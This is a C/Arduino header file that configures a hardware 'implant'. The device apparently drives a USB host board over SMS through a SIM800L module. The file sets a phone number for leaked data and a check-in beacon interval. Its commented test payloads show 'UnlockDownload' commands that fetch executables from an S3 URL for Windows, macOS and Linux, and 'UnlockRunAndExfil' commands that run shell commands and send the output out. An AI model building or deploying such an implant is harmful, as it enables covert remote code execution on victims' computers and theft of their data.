#pragma once

#include "C_USBhost.h"
#include <SoftwareSerial.h>

#define LEAK_PHONE_NUMBER "+14422457648"
// We need to comment the next line, #define DEBUG false won't work as expected
//#define DEBUG true
// Used by Oca to debug the code with an arduino without a SIM module and without an USB host
//#define DEBUGWITHOUTSIM true
//#define DEBUGWITHOUTSIM_PAYLOAD "UnlockDownload##win##PASSWORD##https://s3.amazonaws.com/hellotesthellotesthello/hello.exe"
//#define DEBUGWITHOUTSIM_PAYLOAD "UnlockDownload##osx##PASSWORD##https://s3.amazonaws.com/hellotesthellotesthello/hello_osx"
//#define DEBUGWITHOUTSIM_PAYLOAD "UnlockDownload##lnx##PASSWORD##https://s3.amazonaws.com/hellotesthellotesthello/hello_lin"
//#define DEBUGWITHOUTSIM_PAYLOAD "UnlockRunAndExfil##win##PASSWORD##mkdir %TEMP%\\malware"
//#define DEBUGWITHOUTSIM_PAYLOAD "UnlockRunAndExfil##osx##PASSWORD##uname -a"
//#define DEBUGWITHOUTSIM_PAYLOAD "UnlockRunAndExfil##lnx##PASSWORD##touch /tmp/malware"

#define IMPLANT_NAME "Implant 1"

extern C_USBhost USBhost;
extern SoftwareSerial SMSSERIAL;

#define SEPARATOR "##"

#define CHAR_LIMIT 140                                
#define BAUD_RATE_SIM800L 57600                    
#define BAUD_RATE_USB_HOST_BOARD 115200             
#define BAUD_RATE_SERIAL 115200

#ifdef DEBUG
#define BEACON_TIME 1 // Time in minutes we will send a beacon to let know it's alive
#else
#define BEACON_TIME 30 // Time in minutes we will send a beacon to let know it's alive
#endif                      
